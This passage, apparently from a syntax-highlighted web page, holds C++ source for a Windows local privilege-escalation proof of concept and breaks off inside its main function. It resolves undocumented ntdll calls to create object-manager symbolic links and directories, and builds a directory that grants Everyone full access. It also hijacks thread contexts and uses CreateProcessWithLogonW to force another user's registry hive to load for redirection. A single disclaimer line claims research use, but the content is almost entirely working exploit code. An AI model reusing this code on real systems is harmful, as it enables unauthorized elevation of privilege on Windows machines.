+</span><span class=lnt>257
+</span><span class=lnt>258
+</span><span class=lnt>259
+</span><span class=lnt>260
+</span><span class=lnt>261
+</span><span class=lnt>262
+</span><span class=lnt>263
+</span><span class=lnt>264
+</span><span class=lnt>265
+</span><span class=lnt>266
+</span><span class=lnt>267
+</span><span class=lnt>268
+</span><span class=lnt>269
+</span><span class=lnt>270
+</span><span class=lnt>271
+</span><span class=lnt>272
+</span><span class=lnt>273
+</span><span class=lnt>274
+</span><span class=lnt>275
+</span><span class=lnt>276
+</span><span class=lnt>277
+</span><span class=lnt>278
+</span><span class=lnt>279
+</span><span class=lnt>280
+</span><span class=lnt>281
+</span><span class=lnt>282
+</span><span class=lnt>283
+</span><span class=lnt>284
+</span><span class=lnt>285
+</span><span class=lnt>286
+</span><span class=lnt>287
+</span><span class=lnt>288
+</span><span class=lnt>289
+</span><span class=lnt>290
+</span><span class=lnt>291
+</span><span class=lnt>292
+</span><span class=lnt>293
+</span><span class=lnt>294
+</span><span class=lnt>295
+</span><span class=lnt>296
+</span><span class=lnt>297
+</span><span class=lnt>298
+</span><span class=lnt>299
+</span><span class=lnt>300
+</span><span class=lnt>301
+</span><span class=lnt>302
+</span><span class=lnt>303
+</span><span class=lnt>304
+</span><span class=lnt>305
+</span><span class=lnt>306
+</span><span class=lnt>307
+</span><span class=lnt>308
+</span><span class=lnt>309
+</span><span class=lnt>310
+</span><span class=lnt>311
+</span><span class=lnt>312
+</span><span class=lnt>313
+</span><span class=lnt>314
+</span><span class=lnt>315
+</span><span class=lnt>316
+</span><span class=lnt>317
+</span><span class=lnt>318
+</span><span class=lnt>319
+</span><span class=lnt>320
+</span><span class=lnt>321
+</span><span class=lnt>322
+</span><span class=lnt>323
+</span><span class=lnt>324
+</span><span class=lnt>325
+</span><span class=lnt>326
+</span><span class=lnt>327
+</span><span class=lnt>328
+</span><span class=lnt>329
+</span><span class=lnt>330
+</span><span class=lnt>331
+</span><span class=lnt>332
+</span><span class=lnt>333
+</span><span class=lnt>334
+</span><span class=lnt>335
+</span><span class=lnt>336
+</span><span class=lnt>337
+</span><span class=lnt>338
+</span><span class=lnt>339
+</span><span class=lnt>340
+</span><span class=lnt>341
+</span><span class=lnt>342
+</span><span class=lnt>343
+</span><span class=lnt>344
+</span><span class=lnt>345
+</span><span class=lnt>346
+</span><span class=lnt>347
+</span><span class=lnt>348
+</span><span class=lnt>349
+</span><span class=lnt>350
+</span><span class=lnt>351
+</span><span class=lnt>352
+</span><span class=lnt>353
+</span><span class=lnt>354
+</span><span class=lnt>355
+</span><span class=lnt>356
+</span><span class=lnt>357
+</span><span class=lnt>358
+</span><span class=lnt>359
+</span><span class=lnt>360
+</span><span class=lnt>361
+</span><span class=lnt>362
+</span><span class=lnt>363
+</span><span class=lnt>364
+</span><span class=lnt>365
+</span><span class=lnt>366
+</span><span class=lnt>367
+</span><span class=lnt>368
+</span><span class=lnt>369
+</span><span class=lnt>370
+</span><span class=lnt>371
+</span><span class=lnt>372
+</span><span class=lnt>373
+</span><span class=lnt>374
+</span><span class=lnt>375
+</span><span class=lnt>376
+</span><span class=lnt>377
+</span><span class=lnt>378
+</span><span class=lnt>379
+</span><span class=lnt>380
+</span><span class=lnt>381
+</span><span class=lnt>382
+</span><span class=lnt>383
+</span><span class=lnt>384
+</span><span class=lnt>385
+</span><span class=lnt>386
+</span><span class=lnt>387
+</span><span class=lnt>388
+</span><span class=lnt>389
+</span><span class=lnt>390
+</span><span class=lnt>391
+</span><span class=lnt>392
+</span><span class=lnt>393
+</span><span class=lnt>394
+</span><span class=lnt>395
+</span><span class=lnt>396
+</span><span class=lnt>397
+</span><span class=lnt>398
+</span><span class=lnt>399
+</span><span class=lnt>400
+</span><span class=lnt>401
+</span><span class=lnt>402
+</span><span class=lnt>403
+</span><span class=lnt>404
+</span><span class=lnt>405
+</span><span class=lnt>406
+</span><span class=lnt>407
+</span><span class=lnt>408
+</span><span class=lnt>409
+</span><span class=lnt>410
+</span><span class=lnt>411
+</span><span class=lnt>412
+</span><span class=lnt>413
+</span><span class=lnt>414
+</span><span class=lnt>415
+</span><span class=lnt>416
+</span><span class=lnt>417
+</span><span class=lnt>418
+</span><span class=lnt>419
+</span><span class=lnt>420
+</span><span class=lnt>421
+</span><span class=lnt>422
+</span><span class=lnt>423
+</span><span class=lnt>424
+</span><span class=lnt>425
+</span><span class=lnt>426
+</span><span class=lnt>427
+</span><span class=lnt>428
+</span><span class=lnt>429
+</span><span class=lnt>430
+</span><span class=lnt>431
+</span><span class=lnt>432
+</span><span class=lnt>433
+</span><span class=lnt>434
+</span><span class=lnt>435
+</span><span class=lnt>436
+</span><span class=lnt>437
+</span><span class=lnt>438
+</span><span class=lnt>439
+</span><span class=lnt>440
+</span><span class=lnt>441
+</span><span class=lnt>442
+</span><span class=lnt>443
+</span><span class=lnt>444
+</span><span class=lnt>445
+</span><span class=lnt>446
+</span><span class=lnt>447
+</span><span class=lnt>448
+</span><span class=lnt>449
+</span><span class=lnt>450
+</span><span class=lnt>451
+</span><span class=lnt>452
+</span><span class=lnt>453
+</span><span class=lnt>454
+</span><span class=lnt>455
+</span><span class=lnt>456
+</span><span class=lnt>457
+</span><span class=lnt>458
+</span><span class=lnt>459
+</span><span class=lnt>460
+</span><span class=lnt>461
+</span><span class=lnt>462
+</span><span class=lnt>463
+</span><span class=lnt>464
+</span><span class=lnt>465
+</span><span class=lnt>466
+</span><span class=lnt>467
+</span><span class=lnt>468
+</span><span class=lnt>469
+</span><span class=lnt>470
+</span><span class=lnt>471
+</span><span class=lnt>472
+</span><span class=lnt>473
+</span><span class=lnt>474
+</span><span class=lnt>475
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=c1>// Disclaimer: For authorized security research and educational use only.
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define _CRT_SECURE_NO_WARNINGS
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;Windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;winternl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;UserEnv.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;AclAPI.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;ntstatus.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;conio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;offreg.h&#34;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;ntdll.lib&#34;)
+</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;userenv.lib&#34;)
+</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;advapi32.lib&#34;)
+</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;offreg.lib&#34;)
+</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;Rpcrt4.lib&#34;)
+</span></span></span><span class=line><span class=cl><span class=cp>#pragma warning(disable : 4996)
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=n>HMODULE</span> <span class=n>hm</span> <span class=o>=</span> <span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;ntdll.dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>NTSTATUS</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>_NtCreateSymbolicLinkObject</span><span class=p>)(</span>
+</span></span><span class=line><span class=cl>	<span class=n>OUT</span> <span class=n>PHANDLE</span>             <span class=n>pHandle</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>ACCESS_MASK</span>          <span class=n>DesiredAccess</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>POBJECT_ATTRIBUTES</span>   <span class=n>ObjectAttributes</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>PUNICODE_STRING</span>      <span class=n>DestinationName</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=n>NTSTATUS</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span><span class=p>)(</span>
+</span></span><span class=line><span class=cl>		<span class=n>OUT</span> <span class=n>PHANDLE</span>             <span class=n>pHandle</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>ACCESS_MASK</span>          <span class=n>DesiredAccess</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>POBJECT_ATTRIBUTES</span>   <span class=n>ObjectAttributes</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>PUNICODE_STRING</span>      <span class=n>DestinationName</span><span class=p>))</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hm</span><span class=p>,</span> <span class=s>&#34;NtCreateSymbolicLinkObject&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>NTSTATUS</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span> <span class=n>_NtCreateDirectoryObjectEx</span><span class=p>)(</span>
+</span></span><span class=line><span class=cl>	<span class=n>OUT</span> <span class=n>PHANDLE</span>             <span class=n>DirectoryHandle</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>ACCESS_MASK</span>          <span class=n>DesiredAccess</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>POBJECT_ATTRIBUTES</span>   <span class=n>ObjectAttributes</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>HANDLE</span> <span class=n>ShadowDirectoryHandle</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>IN</span> <span class=n>ULONG</span> <span class=n>Flags</span><span class=p>)</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=n>NTSTATUS</span><span class=p>(</span><span class=n>WINAPI</span><span class=o>*</span><span class=p>)(</span>
+</span></span><span class=line><span class=cl>		<span class=n>OUT</span> <span class=n>PHANDLE</span>             <span class=n>DirectoryHandle</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>ACCESS_MASK</span>          <span class=n>DesiredAccess</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>POBJECT_ATTRIBUTES</span>   <span class=n>ObjectAttributes</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>HANDLE</span> <span class=n>ShadowDirectoryHandle</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>IN</span> <span class=n>ULONG</span> <span class=n>Flags</span><span class=p>))</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hm</span><span class=p>,</span> <span class=s>&#34;NtCreateDirectoryObjectEx&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=nc>HVarg</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span><span class=o>*</span> <span class=n>username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span><span class=o>*</span> <span class=n>password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hprocess</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hcallerthread</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>GenGUID</span><span class=p>(</span><span class=kt>wchar_t</span><span class=o>*</span> <span class=n>guid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>GUID</span> <span class=n>uid</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>RPC_WSTR</span> <span class=n>wuid</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>UuidCreate</span><span class=p>(</span><span class=o>&amp;</span><span class=n>uid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>UuidToStringW</span><span class=p>(</span><span class=o>&amp;</span><span class=n>uid</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>wuid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span><span class=o>*</span> <span class=n>wuid2</span> <span class=o>=</span> <span class=p>(</span><span class=kt>wchar_t</span><span class=o>*</span><span class=p>)</span><span class=n>wuid</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>wcscpy</span><span class=p>(</span><span class=n>guid</span><span class=p>,</span> <span class=n>wuid2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>CreateDirectoryWithPermissiveDACL</span><span class=p>(</span><span class=kt>wchar_t</span><span class=o>*</span> <span class=n>dirpath</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>PSID</span> <span class=n>pEveryoneSID</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>PACL</span> <span class=n>pACL</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>EXPLICIT_ACCESS</span> <span class=n>ea</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>SID_IDENTIFIER_AUTHORITY</span> <span class=n>SIDAuthWorld</span> <span class=o>=</span> <span class=n>SECURITY_WORLD_SID_AUTHORITY</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>AllocateAndInitializeSid</span><span class=p>(</span><span class=o>&amp;</span><span class=n>SIDAuthWorld</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=n>SECURITY_WORLD_RID</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		<span class=o>&amp;</span><span class=n>pEveryoneSID</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;AllocateAndInitializeSid, error: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>ZeroMemory</span><span class=p>(</span><span class=o>&amp;</span><span class=n>ea</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>EXPLICIT_ACCESS</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>	<span class=n>ea</span><span class=p>.</span><span class=n>grfAccessPermissions</span> <span class=o>=</span> <span class=n>GENERIC_ALL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ea</span><span class=p>.</span><span class=n>grfAccessMode</span> <span class=o>=</span> <span class=n>SET_ACCESS</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ea</span><span class=p>.</span><span class=n>grfInheritance</span> <span class=o>=</span> <span class=n>SUB_CONTAINERS_AND_OBJECTS_INHERIT</span> <span class=o>|</span> <span class=n>NO_INHERITANCE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>ea</span><span class=p>.</span><span class=n>Trustee</span><span class=p>.</span><span class=n>TrusteeForm</span> <span class=o>=</span> <span class=n>TRUSTEE_IS_SID</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ea</span><span class=p>.</span><span class=n>Trustee</span><span class=p>.</span><span class=n>TrusteeType</span> <span class=o>=</span> <span class=n>TRUSTEE_IS_WELL_KNOWN_GROUP</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ea</span><span class=p>.</span><span class=n>Trustee</span><span class=p>.</span><span class=n>ptstrName</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPTSTR</span><span class=p>)</span><span class=n>pEveryoneSID</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>dwRes</span> <span class=o>=</span> <span class=n>SetEntriesInAcl</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ea</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pACL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>dwRes</span> <span class=o>!=</span> <span class=n>ERROR_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;SetEntriesInAcl, error: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dwRes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>FreeSid</span><span class=p>(</span><span class=n>pEveryoneSID</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>PSECURITY_DESCRIPTOR</span> <span class=n>sd</span> <span class=o>=</span> <span class=p>(</span><span class=n>PSECURITY_DESCRIPTOR</span><span class=p>)</span><span class=n>LocalAlloc</span><span class=p>(</span><span class=n>LMEM_FIXED</span><span class=p>,</span> <span class=n>SECURITY_DESCRIPTOR_MIN_LENGTH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>InitializeSecurityDescriptor</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=n>SECURITY_DESCRIPTOR_REVISION</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>SetSecurityDescriptorDacl</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=n>TRUE</span><span class=p>,</span> <span class=n>pACL</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>SECURITY_ATTRIBUTES</span> <span class=n>sa</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>sa</span><span class=p>.</span><span class=n>nLength</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>sa</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>sa</span><span class=p>.</span><span class=n>lpSecurityDescriptor</span> <span class=o>=</span> <span class=n>sd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kt>bool</span> <span class=n>retval</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>CreateDirectory</span><span class=p>(</span><span class=n>dirpath</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>sa</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to create directory %ws, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dirpath</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>		<span class=n>retval</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>sd</span><span class=p>)</span> <span class=n>LocalFree</span><span class=p>(</span><span class=n>sd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>pEveryoneSID</span><span class=p>)</span> <span class=n>FreeSid</span><span class=p>(</span><span class=n>pEveryoneSID</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>pACL</span><span class=p>)</span> <span class=n>LocalFree</span><span class=p>(</span><span class=n>pACL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>retval</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>ThrowFunc</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>throw</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>RaiseExceptionInThread</span><span class=p>(</span><span class=n>HANDLE</span> <span class=n>hthread</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>CONTEXT</span> <span class=n>ctx</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>ctx</span><span class=p>.</span><span class=n>ContextFlags</span> <span class=o>=</span> <span class=n>CONTEXT_FULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>SuspendThread</span><span class=p>(</span><span class=n>hthread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>GetThreadContext</span><span class=p>(</span><span class=n>hthread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>ctx</span><span class=p>.</span><span class=n>Rip</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>ThrowFunc</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=n>SetThreadContext</span><span class=p>(</span><span class=n>hthread</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ctx</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>ResumeThread</span><span class=p>(</span><span class=n>hthread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>DWORD</span> <span class=n>WINAPI</span> <span class=nf>HiveLoaderThread</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span> <span class=n>creds</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>HVarg</span><span class=o>*</span> <span class=n>_creds</span> <span class=o>=</span> <span class=p>(</span><span class=n>HVarg</span><span class=o>*</span><span class=p>)</span><span class=n>creds</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>_creds</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>RaiseExceptionInThread</span><span class=p>(</span><span class=n>_creds</span><span class=o>-&gt;</span><span class=n>hcallerthread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>STARTUPINFO</span> <span class=n>si</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>PROCESS_INFORMATION</span> <span class=n>pi</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>CreateProcessWithLogonW</span><span class=p>(</span><span class=n>_creds</span><span class=o>-&gt;</span><span class=n>username</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>_creds</span><span class=o>-&gt;</span><span class=n>password</span><span class=p>,</span> <span class=n>LOGON_WITH_PROFILE</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>notepad.exe&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>CREATE_SUSPENDED</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>si</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pi</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;CreateProcessWithLogonW failed with error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>		<span class=n>RaiseExceptionInThread</span><span class=p>(</span><span class=n>_creds</span><span class=o>-&gt;</span><span class=n>hcallerthread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>CloseHandle</span><span class=p>(</span><span class=n>pi</span><span class=p>.</span><span class=n>hThread</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>_creds</span><span class=o>-&gt;</span><span class=n>hprocess</span> <span class=o>=</span> <span class=n>pi</span><span class=p>.</span><span class=n>hProcess</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>ERROR_SUCCESS</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>wmain</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>wchar_t</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Usage %ws &lt;username&gt; &lt;password&gt; &lt;target_user_hive&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>OSVERSIONINFO</span> <span class=n>osver</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>osver</span><span class=p>.</span><span class=n>dwOSVersionInfoSize</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>osver</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>GetVersionEx</span><span class=p>(</span><span class=o>&amp;</span><span class=n>osver</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>tid</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hthread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HVarg</span> <span class=n>targ</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>targ</span><span class=p>.</span><span class=n>username</span> <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
